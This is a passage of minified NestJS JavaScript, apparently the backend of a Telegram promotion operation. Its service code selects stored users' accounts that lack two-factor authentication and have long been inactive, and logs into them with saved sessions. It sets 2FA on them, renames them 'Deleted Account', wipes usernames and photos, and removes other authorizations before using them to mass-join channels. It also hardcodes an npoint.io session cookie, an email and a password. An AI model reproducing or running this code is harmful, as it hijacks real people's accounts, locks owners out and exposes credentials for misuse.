client"}),(0,a.Transform)((({value:e})=>e?.trim())),(0,s.IsOptional)(),(0,s.IsString)(),r("design:type",String)],c.prototype,"product",void 0),i([(0,n.ApiPropertyOptional)({description:"Promote mobile numbers of the client"}),(0,a.Transform)((({value:e})=>e?.map((e=>e?.trim())))),(0,s.IsOptional)(),(0,s.IsArray)(),(0,s.ArrayNotEmpty)({message:"Promote mobile numbers must not be empty if provided"}),(0,s.Matches)(/^\+?[0-9]{10,15}$/,{each:!0,message:"Invalid phone number format in promoteMobile"}),r("design:type",Array)],c.prototype,"promoteMobile",void 0)},7908:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateClientDto=void 0;const i=o(9742),r=o(9815);class n extends((0,i.PartialType)(r.CreateClientDto)){}t.UpdateClientDto=n},1013:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.ClientSchema=t.Client=void 0;const n=o(5839),a=o(9742);let s=class{};t.Client=s,i([(0,a.ApiProperty)({example:"paid_giirl_shruthiee",description:"Channel link of the user"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"channelLink",void 0),i([(0,a.ApiProperty)({example:"shruthi",description:"Database collection name"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"dbcoll",void 0),i([(0,a.ApiProperty)({example:"PaidGirl.netlify.app/Shruthi1",description:"Link of the user"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"link",void 0),i([(0,a.ApiProperty)({example:"Shruthi Reddy",description:"Name of the user"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"name",void 0),i([(0,a.ApiProperty)({example:"916265240911",description:"mobile number of the user"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"mobile",void 0),i([(0,a.ApiProperty)({example:"Ajtdmwajt1@",description:"Password of the user"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"password",void 0),i([(0,a.ApiProperty)({example:"https://shruthi1.glitch.me",description:"Repl link of the user"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"repl",void 0),i([(0,a.ApiProperty)({example:"https://shruthiprom0101.glitch.me",description:"Promotion Repl link of the user"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"promoteRepl",void 0),i([(0,a.ApiProperty)({example:"1BQANOTEuM==",description:"Session token"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"session",void 0),i([(0,a.ApiProperty)({example:"ShruthiRedd2",description:"Username of the user"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"username",void 0),i([(0,a.ApiProperty)({example:"shruthi1",description:"Client ID of the user"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"clientId",void 0),i([(0,a.ApiProperty)({example:"https://shruthi1.glitch.me/exit",description:"Deployment key URL"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"deployKey",void 0),i([(0,a.ApiProperty)({example:"ShruthiRedd2",description:"Main account of the user"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"mainAccount",void 0),i([(0,a.ApiProperty)({example:"booklet_10",description:"Product associated with the user"}),(0,n.Prop)({required:!0}),r("design:type",String)],s.prototype,"product",void 0),i([(0,a.ApiProperty)({example:["916265240911"],description:"Promote mobile number of the user"}),(0,n.Prop)({required:!1,type:[String]}),r("design:type",Array)],s.prototype,"promoteMobile",void 0),t.Client=s=i([(0,n.Schema)({collection:"clients",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],s),t.ClientSchema=n.SchemaFactory.createForClass(s)},5321:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.NpointController=void 0;const a=o(3563),s=o(6954),c=o(9742);let l=class{constructor(e){this.npointService=e}async fetchDocument(e){try{return await this.npointService.fetchDocument(e)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.NOT_FOUND)}}async postDocument(e){try{return await this.npointService.postDocument(e)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.BAD_REQUEST)}}async fetchAllDocuments(){try{return await this.npointService.fetchAllDocuments()}catch(e){throw new a.HttpException(e.message,a.HttpStatus.INTERNAL_SERVER_ERROR)}}async updateDocument(e,t){try{return await this.npointService.updateDocument(e,t)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.NOT_FOUND)}}};t.NpointController=l,i([(0,a.Get)("documents/:id"),(0,c.ApiOperation)({summary:"Fetch a document by ID"}),(0,c.ApiParam)({name:"id",description:"The ID of the document to fetch"}),(0,c.ApiResponse)({status:200,description:"Document fetched successfully"}),(0,c.ApiResponse)({status:404,description:"Document not found"}),n(0,(0,a.Param)("id")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],l.prototype,"fetchDocument",null),i([(0,a.Post)("documents"),(0,c.ApiOperation)({summary:"Post a new document"}),(0,c.ApiBody)({description:"The document to post",schema:{example:{title:"My Document",content:"This is the content of the document."}}}),(0,c.ApiResponse)({status:201,description:"Document posted successfully"}),(0,c.ApiResponse)({status:400,description:"Invalid input"}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[Object]),r("design:returntype",Promise)],l.prototype,"postDocument",null),i([(0,a.Get)("documents"),(0,c.ApiOperation)({summary:"Fetch all documents"}),(0,c.ApiResponse)({status:200,description:"List of all documents fetched successfully"}),(0,c.ApiResponse)({status:500,description:"Internal server error"}),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",Promise)],l.prototype,"fetchAllDocuments",null),i([(0,a.Put)("documents/:id"),(0,c.ApiOperation)({summary:"Update a document by ID"}),(0,c.ApiParam)({name:"id",description:"The ID of the document to update"}),(0,c.ApiBody)({description:"The updated document",schema:{example:{title:"Updated Document",content:"This is the updated content of the document."}}}),(0,c.ApiResponse)({status:200,description:"Document updated successfully"}),(0,c.ApiResponse)({status:404,description:"Document not found"}),n(0,(0,a.Param)("id")),n(1,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[String,Object]),r("design:returntype",Promise)],l.prototype,"updateDocument",null),t.NpointController=l=i([(0,c.ApiTags)("NPoint API"),(0,a.Controller)("npoint"),r("design:paramtypes",[s.NpointService])],l)},889:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.NpointModule=void 0;const r=o(3563),n=o(6954),a=o(5321);let s=class{};t.NpointModule=s,t.NpointModule=s=i([(0,r.Module)({controllers:[a.NpointController],providers:[n.NpointService],exports:[n.NpointService]})],s)},6954:function(e,t,o){var i,r=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.NpointService=void 0;const a=o(3563),s=n(o(8938));let c=i=class{constructor(){this.logger=new a.Logger(i.name),this.csrfToken=null,this.cookie="_npoint_session=MTBOeElFZ0pXV0oxTm9xd1dQQ0tNYnhVYWg1blFCMUVtUUJVWFQ1cGZwdlNwSTdacjBVTStJbDlHaGlWd0pGUDRzUmRaYnZNQVNTMTVmY1R6dEVUd0RPMXVFcmE1cnFYY09qd1A5TFpNVnZOUnVJRnlWV3ZtODk0ajlQVXQ0QzQ0MUtGeU5mTTB5dGFPNCtLUW9tVy9yTmFRZzlRQUdRK0NkQVVtZGxtMVEySzN0TC9sUjdMR2RjVW5xTmtleWw4TWdPOVNMa2JaZEs1c1o3eGE3UHdsQ2JiTEdQbHhUaysraCsrcG9LM25YREdyTDdpYWlHQ0wraEhNV3NXbzJtK1YvVzEvVTh2Z0N5bnpzU1hqcndiM041L2I3R29UMDY3RitBYkxvTktWaUVmdTg4SGJORjRTS25uZ2JDSWhmNWFoem0vNGNvUnAzMDBsQ0FJcUZTMjdnPT0tLWs2a2x2SUZqcHhDN1A0eFdUaWhBeVE9PQ%3D%3D--4d0883b9956c6d2744389228dab7321ff2eb88e5",this.baseUrl="https://www.npoint.io",this.signInUrl="https://www.npoint.io/users/sign_in"}async fetchCsrfToken(){this.logger.debug("Fetching CSRF token...");try{let e=JSON.stringify({user:{email:"dodieajt@gmail.com",password:"Ajtdmwajt1@"}}),t={method:"post",maxBodyLength:1/0,url:this.signInUrl,headers:{"Content-Type":"application/json",Cookie:this.cookie},data:e};const o=await s.default.request(t);if(console.log("Cookie:",o.headers["set-cookie"][0]),this.cookie=o.headers["set-cookie"][0],this.csrfToken=await this.fetchCsrfTokenFromHtml(o.data),!this.csrfToken)throw new Error("CSRF token not found in the sign-in response.");return this.logger.debug("CSRF token fetched successfully."),this.csrfToken}catch(e){throw this.logger.error(`Failed to fetch CSRF token: ${e.message}`),new Error(`Failed to fetch CSRF token: ${e.message}`)}}async ensureCsrfToken(){this.csrfToken||await this.fetchCsrfToken()}async fetchDocument(e){this.logger.debug(`Fetching document with ID: ${e}`),await this.ensureCsrfToken();try{const t=await s.default.get(`${this.baseUrl}/documents/${e}`,{headers:{"X-CSRF-Token":this.csrfToken,Cookie:this.cookie}});return this.logger.debug(`Document with ID: ${e} fetched successfully.`),t.data}catch(t){throw this.logger.error(`Failed to fetch document with ID: ${e}: ${t.message}`),new Error(`Failed to fetch document: ${t.message}`)}}async postDocument(e){this.logger.debug("Posting a new document..."),await this.ensureCsrfToken();try{const t=await s.default.post(`${this.baseUrl}/documents`,{generate_contents:!0},{headers:{"X-CSRF-Token":this.csrfToken,Cookie:this.cookie}});return this.logger.debug(`Document posted successfully. Updating document with token: ${t.data.token}`),await this.updateDocument(t.data.token,e),t.data}catch(e){throw this.logger.error(`Failed to post document: ${e.message}`),new Error(`Failed to post document: ${e.message}`)}}async updateDocument(e,t){this.logger.debug(`Updating document with ID: ${e}`),await this.ensureCsrfToken();const o={contents:JSON.stringify(t),original_contents:JSON.stringify(t),schema:null,original_schema:""};try{const t=await s.default.put(`${this.baseUrl}/documents/${e}`,o,{headers:{"X-CSRF-Token":this.csrfToken,Cookie:this.cookie}});return this.logger.debug(`Document with ID: ${e} updated successfully.`),t.data}catch(t){throw this.logger.error(`Failed to update document with ID: ${e}: ${t.message}`),new Error(`Failed to update document: ${t.message}`)}}async fetchAllDocuments(){await this.ensureCsrfToken();try{return(await s.default.get(`${this.baseUrl}/documents`,{headers:{"X-CSRF-Token":this.csrfToken,Cookie:this.cookie}})).data}catch(e){throw new Error(`Failed to fetch all documents: ${e.message}`)}}async fetchCsrfTokenFromHtml(e){try{const t=e.match(/<meta name="csrf-token" content="([^"]+)"/);if(!t||!t[1])throw new Error("CSRF token not found in the HTML response.");const o=t[1];return console.log("CSRF Token:",o),o}catch(e){console.error("Error fetching CSRF token:",e)}}};t.NpointService=c,t.NpointService=c=i=r([(0,a.Injectable)()],c)},8977:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreatePromoteClientDto=void 0;const n=o(9742),a=o(7403);class s{}t.CreatePromoteClientDto=s,i([(0,n.ApiProperty)({description:"Telegram ID of the client",example:"123456789"}),(0,a.IsString)(),r("design:type",String)],s.prototype,"tgId",void 0),i([(0,n.ApiProperty)({description:"Mobile number of the client",example:"+1234567890"}),(0,a.IsString)(),r("design:type",String)],s.prototype,"mobile",void 0),i([(0,n.ApiProperty)({description:"Date of the session",example:"2023-06-22"}),(0,a.IsString)(),r("design:type",String)],s.prototype,"availableDate",void 0),i([(0,n.ApiProperty)({description:"lastActive identifier",example:"2023-06-22"}),(0,a.IsString)(),r("design:type",String)],s.prototype,"lastActive",void 0),i([(0,n.ApiProperty)({description:"Channel Count",example:23,type:Number}),(0,a.IsNumber)(),r("design:type",Number)],s.prototype,"channels",void 0)},3993:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.SearchPromoteClientDto=void 0;const n=o(9742),a=o(7403);class s{}t.SearchPromoteClientDto=s,i([(0,n.ApiPropertyOptional)({description:"Telegram ID of the client",example:"123456789"}),(0,a.IsOptional)(),(0,a.IsString)(),r("design:type",String)],s.prototype,"tgId",void 0),i([(0,n.ApiPropertyOptional)({description:"Mobile number of the client",example:"+1234567890"}),(0,a.IsOptional)(),(0,a.IsString)(),r("design:type",String)],s.prototype,"mobile",void 0),i([(0,n.ApiPropertyOptional)({description:"availableDate of the promoteClient",example:"2023-06-22"}),(0,a.IsOptional)(),(0,a.IsString)(),r("design:type",String)],s.prototype,"availableDate",void 0),i([(0,n.ApiPropertyOptional)({description:"Channel Count",example:23,type:Number}),(0,a.IsNumber)(),r("design:type",Number)],s.prototype,"channels",void 0)},8150:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdatePromoteClientDto=void 0;const i=o(9742),r=o(8977);class n extends((0,i.PartialType)(r.CreatePromoteClientDto)){}t.UpdatePromoteClientDto=n},2581:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteClientController=void 0;const a=o(3563),s=o(9742),c=o(1870),l=o(8977),p=o(3993),d=o(8150);let u=class{constructor(e){this.clientService=e}async create(e){return this.clientService.create(e)}async search(e){return this.clientService.search(e)}async joinChannelsforPromoteClients(){return this.clientService.joinchannelForPromoteClients()}async checkpromoteClients(){return this.clientService.checkPromoteClients(),"initiated Checking"}async addNewUserstoPromoteClients(e){return this.clientService.addNewUserstoPromoteClients(e.badIds,e.goodIds),"initiated Checking"}async findAll(){return this.clientService.findAll()}async setAsPromoteClient(e){return await this.clientService.setAsPromoteClient(e)}async findOne(e){return this.clientService.findOne(e)}async update(e,t){return this.clientService.update(e,t)}async createdOrupdate(e,t){return this.clientService.createOrUpdate(e,t)}async remove(e){return this.clientService.remove(e)}async executeQuery(e){try{return await this.clientService.executeQuery(e)}catch(e){throw e}}};t.PromoteClientController=u,i([(0,a.Post)(),(0,s.ApiOperation)({summary:"Create user data"}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[l.CreatePromoteClientDto]),r("design:returntype",Promise)],u.prototype,"create",null),i([(0,a.Get)("search"),(0,s.ApiOperation)({summary:"Search user data"}),n(0,(0,a.Query)()),r("design:type",Function),r("design:paramtypes",[p.SearchPromoteClientDto]),r("design:returntype",Promise)],u.prototype,"search",null),i([(0,a.Get)("joinChannelsForPromoteClients"),(0,s.ApiOperation)({summary:"Join Channels for PromoteClients"}),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",Promise)],u.prototype,"joinChannelsforPromoteClients",null),i([(0,a.Get)("checkPromoteClients"),(0,s.ApiOperation)({summary:"Check Promote Clients"}),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",Promise)],u.prototype,"checkpromoteClients",null),i([(0,a.Post)("addNewUserstoPromoteClients"),(0,s.ApiOperation)({summary:"Add New Users to Promote Clients"}),(0,s.ApiBody)({type:Object}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[Object]),r("design:returntype",Promise)],u.prototype,"addNewUserstoPromoteClients",null),i([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get all user data"}),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",Promise)],u.prototype,"findAll",null),i([(0,a.Get)("SetAsPromoteClient/:mobile"),(0,s.ApiOperation)({summary:"Set as Promote Client"}),(0,s.ApiParam)({name:"mobile",description:"User mobile number",type:String}),n(0,(0,a.Param)("mobile")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],u.prototype,"setAsPromoteClient",null),i([(0,a.Get)(":mobile"),(0,s.ApiOperation)({summary:"Get user data by ID"}),n(0,(0,a.Param)("mobile")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],u.prototype,"findOne",null),i([(0,a.Patch)(":mobile"),(0,s.ApiOperation)({summary:"Update user data by ID"}),n(0,(0,a.Param)("mobile")),n(1,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[String,d.UpdatePromoteClientDto]),r("design:returntype",Promise)],u.prototype,"update",null),i([(0,a.Put)(":mobile"),(0,s.ApiOperation)({summary:"Update user data by ID"}),n(0,(0,a.Param)("mobile")),n(1,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[String,d.UpdatePromoteClientDto]),r("design:returntype",Promise)],u.prototype,"createdOrupdate",null),i([(0,a.Delete)(":mobile"),(0,s.ApiOperation)({summary:"Delete user data by ID"}),n(0,(0,a.Param)("mobile")),r("design:type",Function),r("design:paramtypes",[String]),r("design:returntype",Promise)],u.prototype,"remove",null),i([(0,a.Post)("query"),(0,s.ApiOperation)({summary:"Execute a custom MongoDB query"}),(0,s.ApiBody)({type:Object}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[Object]),r("design:returntype",Promise)],u.prototype,"executeQuery",null),t.PromoteClientController=u=i([(0,s.ApiTags)("Promote Clients"),(0,a.Controller)("promoteclients"),r("design:paramtypes",[c.PromoteClientService])],u)},1373:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteClientModule=void 0;const r=o(3563),n=o(5839),a=o(1870),s=o(2581),c=o(4013),l=o(282),p=o(3322),d=o(7422),u=o(8009),f=o(5774),y=o(1324),m=o(8421);let h=class{};t.PromoteClientModule=h,t.PromoteClientModule=h=i([(0,r.Module)({imports:[f.initModule,n.MongooseModule.forFeature([{name:"promoteClientModule",schema:c.PromoteClientSchema,collection:"promoteClients"}]),(0,r.forwardRef)((()=>l.TelegramModule)),(0,r.forwardRef)((()=>d.UsersModule)),(0,r.forwardRef)((()=>p.ActiveChannelsModule)),(0,r.forwardRef)((()=>u.ClientModule)),(0,r.forwardRef)((()=>y.ChannelsModule)),(0,r.forwardRef)((()=>m.BufferClientModule))],controllers:[s.PromoteClientController],providers:[a.PromoteClientService],exports:[a.PromoteClientService]})],h)},1870:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteClientService=void 0;const a=o(9597),s=o(3563),c=o(5839),l=o(6037),p=o(2995),d=o(7385),u=o(9127),f=o(9155),y=o(6185),m=o(5562),h=o(4374);let g=class{constructor(e,t,o,i,r,n,a){this.promoteClientModel=e,this.telegramService=t,this.usersService=o,this.activeChannelsService=i,this.clientService=r,this.channelsService=n,this.bufferClientService=a,this.joinChannelMap=new Map}async create(e){return new this.promoteClientModel(e).save()}async findAll(){return this.promoteClientModel.find().exec()}async findOne(e,t=!0){const o=(await this.promoteClientModel.findOne({mobile:e}).exec())?.toJSON();if(!o&&t)throw new s.NotFoundException(`PromoteClient with mobile ${e} not found`);return o}async update(e,t){const o=await this.promoteClientModel.findOneAndUpdate({mobile:e},{$set:t},{new:!0,upsert:!0,returnDocument:"after"}).exec();if(!o)throw new s.NotFoundException(`User with mobile ${e} not found`);return o}async createOrUpdate(e,t){const o=(await this.promoteClientModel.findOne({mobile:e}).exec())?.toJSON();return o?(console.log("Updating"),this.update(o.mobile,t)):(console.log("creating"),this.create(t))}async remove(e){if(await(0,y.fetchWithTimeout)(`${(0,y.ppplbot)()}&text=${encodeURIComponent(`Deleting Promote Client : ${e}`)}`),0===(await this.promoteClientModel.deleteOne({mobile:e}).exec()).deletedCount)throw new s.NotFoundException(`PromoteClient with mobile ${e} not found`)}async search(e){return console.log(e),e.firstName&&(e.firstName={$regex:new RegExp(e.firstName,"i")}),console.log(e),this.promoteClientModel.find(e).exec()}async executeQuery(e,t,o,i){try{if(!e)throw new s.BadRequestException("Query is invalid.");const r=this.promoteClientModel.find(e);return t&&r.sort(t),o&&r.limit(o),i&&r.skip(i),await r.exec()}catch(e){throw new s.InternalServerErrorException(e.message)}}removeFromPromoteMap(e){this.joinChannelMap.delete(e)}clearPromoteMap(){console.log("PromoteMap cleared"),this.joinChannelMap.clear()}async joinchannelForPromoteClients(e=!0){if(this.telegramService.getActiveClientSetup())return console.log("Ignored active check for promote channels as an active client setup exists"),"Active client setup exists, skipping promotion";console.log("Joining Channel Started"),this.clearJoinChannelInterval();try{const t=e?[]:Array.from(this.joinChannelMap.keys());await this.telegramService.disconnectAll(),await(0,d.sleep)(2e3);const o=await this.promoteClientModel.find({channels:{$lt:250},mobile:{$nin:t}}).sort({channels:1}).limit(4);if(o.length>0){for(const e of o)try{const t=await this.telegramService.createClient(e.mobile,!1,!1);console.log("Started Joining for : ",e.mobile);const o=await t.channelInfo(!0);console.log("Existing Channels Length : ",o.ids.length),await this.update(e.mobile,{channels:o.ids.length});let i=[];o.canSendFalseCount<50?(i=o.ids.length<220?await this.channelsService.getActiveChannels(150,0,o.ids):await this.activeChannelsService.getActiveChannels(150,0,o.ids),this.joinChannelMap.set(e.mobile,i)):await t.leaveChannels(o.canSendFalseChats),await this.telegramService.deleteClient(e.mobile)}catch(t){const o=(0,y.parseError)(t);console.error(`Error while joining channels for mobile: ${e.mobile}`,o)}this.joinChannelQueue()}return console.log("Joining Channel Triggered Successfully for",o.length),`Initiated Joining channels for ${o.length}`}catch(e){throw console.error("Error during the joinchannelForPromoteClients process: ",e),new Error("Failed to initiate channel joining process")}}async joinChannelQueue(){Array.from(this.joinChannelMap.keys()).length>0&&(this.joinChannelIntervalId=setInterval((async()=>{const e=Array.from(this.joinChannelMap.keys());if(e.length>0){console.log("In JOIN CHANNEL interval: ",(new Date).toISOString());for(const t of e){const e=this.joinChannelMap.get(t);if(e&&e.length>0){const o=e.shift();console.log(t," Pending Channels: ",e.length),this.joinChannelMap.set(t,e);try{await this.telegramService.createClient(t,!1,!1),console.log(t," Trying to join: ",o.username),await this.telegramService.tryJoiningChannel(t,o)}catch(e){const i=(0,y.parseError)(e,`${t} @${o.username} Outer Err ERR: `);console.error(`${t} Error while joining @${o.username}`,i),("FloodWaitError"===i.error||"CHANNELS_TOO_MUCH"===e.errorMessage)&&(console.log(`${t} has FloodWaitError or joined too many channels. Handling...`),this.removeFromPromoteMap(t),await this.telegramService.getChannelInfo(t,!0))}finally{await this.telegramService.deleteClient(t)}}else this.joinChannelMap.delete(t)}}else this.clearJoinChannelInterval()}),24e4))}clearJoinChannelInterval(){this.joinChannelIntervalId&&(clearInterval(this.joinChannelIntervalId),this.joinChannelIntervalId=null,setTimeout((()=>{this.joinchannelForPromoteClients(!1)}),3e4))}async setAsPromoteClient(e,t=new Date(Date.now()-864e5).toISOString().split("T")[0]){const o=(await this.usersService.search({mobile:e,expired:!1}))[0];if(!o)throw new s.BadRequestException("user not found");if(await this.findOne(e,!1))throw new s.ConflictException("PromoteClient already exist");const i=await this.clientService.findAll(),r=i.map((e=>e?.mobile)),n=i.flatMap((e=>e?.promoteMobile));if(r.includes(e)||n.includes(e))throw new s.BadRequestException("Number is a Active Client");{const i=await this.telegramService.createClient(e,!1);try{await i.set2fa(),await(0,d.sleep)(15e3),await i.updateUsername(""),await(0,d.sleep)(3e3),await i.updatePrivacyforDeletedAccount(),await(0,d.sleep)(3e3),await i.updateProfile("Deleted Account","Deleted Account"),await(0,d.sleep)(3e3),await i.deleteProfilePhotos();const r=await this.telegramService.getChannelInfo(e,!0),n={tgId:o.tgId,lastActive:"default",mobile:o.mobile,availableDate:t,channels:r.ids.length};await this.promoteClientModel.findOneAndUpdate({tgId:o.tgId},{$set:n},{new:!0,upsert:!0}).exec()}catch(e){const t=(0,y.parseError)(e);throw new s.HttpException(t.message,parseInt(t.status))}return await this.telegramService.deleteClient(e),"Client set as promote successfully"}}async checkPromoteClients(){if(this.telegramService.getActiveClientSetup())console.log("ignored active check promote channels as active client setup exists");else{await this.telegramService.disconnectAll(),await(0,d.sleep)(2e3);const e=await this.findAll();let t=[],o=[];if(e.length<80)for(let t=0;t<80-e.length&&o.length<4;t++)o.push(t.toString());const i=await this.clientService.findAll(),r=await this.bufferClientService.findAll(),n=[...i.map((e=>e.mobile)),...i.flatMap((e=>e.promoteMobile))],a=r.map((e=>e.mobile));new Date(Date.now()).toISOString().split("T")[0];for(const i of e)if(n.includes(i.mobile)||a.includes(i.mobile))console.log("Number is a Active Client"),t.push(i.mobile),this.remove(i.mobile);else try{const e=await this.telegramService.createClient(i.mobile,!0,!1),r=await e.getMe();r.username&&(await this.telegramService.updateUsername(i.mobile,""),await(0,d.sleep)(2e3)),"Deleted Account"!==r.firstName&&(await this.telegramService.updateNameandBio(i.mobile,"Deleted Account",""),await(0,d.sleep)(2e3)),await this.telegramService.deleteProfilePhotos(i.mobile),!await e.hasPassword()&&o.length<4?(console.log("Client does not have password"),o.push(i.mobile)):(console.log(i.mobile," :  ALL Good"),t.push(i.mobile)),await this.telegramService.removeOtherAuths(i.mobile),await(0,d.sleep)(2e3),await this.telegramService.deleteClient(i.mobile)}catch(e){(0,y.parseError)(e),o.push(i.mobile),this.remove(i.mobile),await this.telegramService.deleteClient(i.mobile)}t=[...t,...n,...a],console.log("GoodIds: ",t.length,"BadIds : ",o.length),this.addNewUserstoPromoteClients(o,t)}}async addNewUserstoPromoteClients(e,t){const o=new Date(Date.now()-7776e6).toISOString().split("T")[0],i=await this.usersService.executeQuery({mobile:{$nin:t},twoFA:!1,expired:!1,lastActive:{$lt:o},totalChats:{$gt:250}},{tgId:1},e.length+3);for(console.log("New promote documents to be added: ",i.length);e.length>0&&i.length>0;){const t=i.shift();try{try{const o=await this.telegramService.createClient(t.mobile,!1),i=await o.hasPassword();if(console.log("hasPassword: ",i),i)console.log("Failed to Update as PromoteClient has Password"),await this.usersService.update(t.tgId,{twoFA:!0}),await this.telegramService.deleteClient(t.mobile);else{await 